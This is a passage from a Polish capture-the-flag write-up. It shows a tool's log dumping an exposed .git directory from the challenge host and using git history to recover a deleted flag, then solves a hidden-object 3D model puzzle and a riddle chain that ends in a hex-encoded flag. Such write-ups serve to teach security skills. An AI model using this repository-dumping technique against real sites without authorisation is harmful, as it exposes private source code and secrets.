[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/FETCH_HEAD responded with status code 403
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/HEAD [200]
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/ORIG_HEAD [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/ORIG_HEAD responded with status code 403
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/info/refs [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/info/refs responded with status code 403
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/logs/HEAD [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/logs/refs/stash [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/logs/refs/stash responded with status code 403
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/config [200]
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/logs/refs/remotes/origin/HEAD [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/logs/refs/remotes/origin/HEAD responded with status code 403
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/logs/refs/remotes/origin/master [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/logs/refs/remotes/origin/master responded with status code 403
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/logs/refs/heads/master [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/packed-refs [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/packed-refs responded with status code 403
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/refs/remotes/origin/master [403]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/refs/remotes/origin/HEAD [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/refs/remotes/origin/master responded with status code 403
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/refs/remotes/origin/HEAD responded with status code 403
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/refs/heads/master [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/refs/stash [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/refs/stash responded with status code 403
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/refs/wip/wtree/refs/heads/master [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/refs/wip/wtree/refs/heads/master responded with status code 403
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/refs/wip/index/refs/heads/master [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/refs/wip/index/refs/heads/master responded with status code 403
[-] Finding packs
[-] Finding objects
[-] Fetching objects
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/e5/c87aa73fcb1536dddfede926583ef2e0c83f9d [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/99/30221ea79d7877c2b143675f2999080c21e116 [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/00/00000000000000000000000000000000000000 [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/00/00000000000000000000000000000000000000 responded with status code 403
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/79/5727cd49e0c4f49581151c9ec6bd856650f842 [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/e9/129429abef9b6a7506582931ac0fee0235ca74 [200]
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/12/7627a6875d7ce9079d2f06d21e85623f3ddab6 [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/bb/267f6a5f9435055601fd827b9d863fa50374be [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/77/3f7fd7e46604f6f2ade32da95517a61f9ee2b0 [200]
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/78/b6991805a7380f6a48c4e7aa4c17966042c320 [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/1d/4d19e62c15d19fc856f32cce895bea5a33eeee [200]
[-] Running git checkout .
```

Dzięki niemu w folderze dump odtworzone zostanie repozytorium o które nam chodzi. Teraz wystarczy, że wyświetlimy listę zmian na pliku index.html, aby przeczytać flagę która kiedyś tam była, ale została zamazana.

```bash
git log -p -- index.html
```
## MISC

### Śmieszna maupa

Naszym oczom ukazuje się strona z wbudowanym viewerem plików 3d. Na ekranie śmieszna maupa:

<img src="img/maupa.png?raw=true" width="400px" />

Zaglądamy w źródło i widzimy między innymi plik z modelem maupy dostępny pod adresem https://1753ctf.ams3.digitaloceanspaces.com/m/monki.glb

Tutaj do akcji wkracza Blender. Importujemy plik glb, otwieramy i usuwamy kolejne obiekty. Okazuje się, że w postumencie schowany był trójwymiary model z tekstem zawierającym flagę. 

### Śmieszne zagadki

Zadanie traktuje nas serią pytań:

> Ilu było krasnoludków? 
> A zasad dynamiki newtona? 
> Która liczba jest większa, 1 czy -1? 
> Ilu muzyków liczy sekstet? 
> Ile pierścieni władzy trafiło w ręce ludzi? 
> Którym pasażerem był na Nostromo obcy? 
> Jaką liczbę atomową ma to co czyni związki organicznymi? 
> Ile koron jest w pieninach? 
> A jaką liczbą wybierzemy drugi element tablicy w języku JavaScript?

Odpowiedzi 7, 3, 1, 6, 9, 8, 6, 3, 1... Razem tworzą liczbę która wygląda jakby.. czyżby to był numer telefonu? Jak to sprawdzić? Trochę głupio dzwonić o drugiej w nocy pod losowe numery, ale w końcu decydujemy się na to, a tam? Fotowoltaika!

> Dodzwonili się Państwo do firmy Twoja Fotowoltaika na Twoim Dachu Spółka Akcyjna z Ograniczoną Odpowiedzialnością. Państwa dane przetwarzane są zgodnie z RODO. Nasza infolinia czynna jest w dni robocze o godzinie 17:53. Zapraszamy do kontaktu w godzinach urzędowania infolinii. 31 37 35 33 63 7b 73 6f 62 69 65 5f 72 61 79 7d

Tajny szyfr na końcu wiadomości to heksadecymalnie zapisana flaga.

### Dziękuję bardzo wszystkim za uczestnictwo!
